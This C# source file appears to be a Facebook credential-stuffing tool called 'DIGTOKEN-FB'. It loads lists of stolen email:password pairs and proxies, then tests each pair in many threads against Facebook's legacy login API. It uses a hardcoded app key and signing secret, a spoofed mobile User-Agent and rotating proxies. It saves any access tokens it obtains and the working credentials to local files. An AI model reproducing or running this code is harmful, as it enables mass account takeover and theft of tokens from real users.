using c_auth;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace FB_CHECKER
{
  internal class Program
  {
    private static List<string> listproxy = new List<string>();
    private static List<string> listcombo = new List<string>();
    private static int success = 0;
    private static int fail = 0;
    private static int check = 0;
    private static Random rand = new Random();
    public static string[] proxys;

    private static void Main(string[] args)
    {
      Console.Title = "DIGTOKEN-FB By Kong12384abc | S > 0 | F > 0";
      Console.Beep(659, 125);
      Console.Beep(659, 125);
      Thread.Sleep(125);
      Console.Beep(659, 125);
      Thread.Sleep(167);
      Console.Beep(523, 125);
      Console.Beep(659, 125);
      Thread.Sleep(125);
      Console.Beep(784, 125);
      Thread.Sleep(375);
      Console.Title = "DIGTOKEN-FB By Kong12384abc| S > 0 | F > 0";
      c_api.c_init("1.0", "Z6lZieIEeVsFdSPq6imKvIyzDOJb5bSzLA2rPF2mern", "d5d666604974a846405ae8b201b57124");
      while (true)
      {
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.Write("1. | [ ");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write(" DIG TOKEN");
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.Write(" ] \n");
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.Write("2. | [ ");
        Console.ForegroundColor = ConsoleColor.White;
        Console.Write(" DOWANLAOD COMBOP&PROXY");
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.Write(" ] \n");
        Console.WriteLine(" ");
        Console.Write("Option => ");
        string str = Console.ReadLine();
        if (!(str == "1"))
        {
          if (str == "2")
            mod.dw();
          else
            goto label_5;
        }
        else
          break;
      }
      Console.Clear();
      goto label_6;
label_5:
      Console.ForegroundColor = ConsoleColor.Red;
      Console.WriteLine("Fail Option !");
label_6:
      mod.Text();
      Console.ForegroundColor = ConsoleColor.White;
      Console.Write("THREAD => ");
      int length = int.Parse(Console.ReadLine());
      Console.Write("COMBO => ");
      string path1 = Console.ReadLine();
      Console.Write("PROXY => ");
      string path2 = Console.ReadLine();
      Console.Clear();
      mod.text1();
      using (StreamReader streamReader = new StreamReader((Stream) new FileStream(path1, FileMode.OpenOrCreate, FileAccess.Read), Encoding.UTF8))
      {
        string str;
        while ((str = streamReader.ReadLine()) != null)
        {
          Program.listcombo.Add(str);
          Console.ForegroundColor = ConsoleColor.Green;
        }
      }
      using (StreamReader streamReader = new StreamReader((Stream) new FileStream(path2, FileMode.OpenOrCreate, FileAccess.Read), Encoding.UTF8))
      {
        string str;
        while ((str = streamReader.ReadLine()) != null)
        {
          Program.listproxy.Add(str);
          Console.ForegroundColor = ConsoleColor.Green;
        }
        Program.proxys = Program.listproxy.ToArray();
      }
      Thread[] threadArray = new Thread[length];
      for (int index = 0; index < length; ++index)
      {
        threadArray[index] = new Thread(new ThreadStart(Program.GetToken));
        threadArray[index].Name = "Thread => " + index.ToString();
        threadArray[index].Start();
        new Thread(new ThreadStart(Program.GetToken)).Start();
      }
    }

    private static void GetToken()
    {
      while (true)
      {
        using (MD5 md5Hash1 = MD5.Create())
        {
          try
          {
            string str1 = Program.listcombo[0];
            Program.listcombo.RemoveAt(0);
            string[] strArray = str1.Split(':');
            string str2 = strArray[0];
            string str3 = strArray[1];
            string input = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=" + str2 + "format=JSONmethod=auth.loginpassword=" + str3 + "v=1.062f8ce9f74b12f84c123cc23437a4a32";
            string md5Hash2 = Program.GetMd5Hash(md5Hash1, input);
            using (WebClient webClient = new WebClient())
            {
              WebProxy webProxy = new WebProxy(Program.proxys[Program.rand.Next(0, Program.proxys.Length - 1)]);
              webClient.Proxy = (IWebProxy) webProxy;
              webClient.Headers["User-Agent"] = "[FBAN/FB4A;FBAV/37.0.0.0.109;FBBV/11557663;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Android;FBMF/unknown;FBBD/generic;FBPN/com.facebook.katana;FBDV/google_sdk;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]";
              string str4 = webClient.DownloadString("https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email=" + str2 + "&format=JSON&method=auth.login&password=" + str3 + "&v=1.0&sig=" + md5Hash2);
              FB_CHECKER.Json.RootObject rootObject = JsonConvert.DeserializeObject<FB_CHECKER.Json.RootObject>(str4);
              try
              {
                if (str4.Contains(rootObject.access_token))
                {
                  string longTimeString = DateTime.Now.ToLongTimeString();
                  Console.ForegroundColor = ConsoleColor.Blue;
                  Console.Write(longTimeString);
                  Console.ForegroundColor = ConsoleColor.White;
                  Console.Write(" | ");
                  Console.ForegroundColor = ConsoleColor.Green;
                  Console.Write("TOKEN ");
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("[");
                  Console.ForegroundColor = ConsoleColor.White;
                  Console.Write(Program.success.ToString());
                  Console.ForegroundColor = ConsoleColor.Red;
                  Console.Write("]\n");
                  Console.Beep(1000, 500);
                  ++Program.success;
                  using (StreamWriter streamWriter = System.IO.File.AppendText("token.txt"))
                    streamWriter.WriteLine(rootObject.access_token);
                  using (StreamWriter streamWriter = System.IO.File.AppendText("scombo.txt"))
                    streamWriter.WriteLine(str1);
                }
              }
              catch
              {
                ++Program.fail;
              }
              Console.Title = "DIGTOKEN-FB  By Kong12384abc | F > " + Program.success.ToString() + " | S > " + Program.fail.ToString();
            }
          }
          catch (Exception ex)
          {
          }
        }
      }
    }

    private static string GetMd5Hash(MD5 md5Hash, string input)
    {
      byte[] hash = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));
      StringBuilder stringBuilder = new StringBuilder();
      for (int index = 0; index < hash.Length; ++index)
        stringBuilder.Append(hash[index].ToString("x2"));
      return stringBuilder.ToString();
    }
  }
}
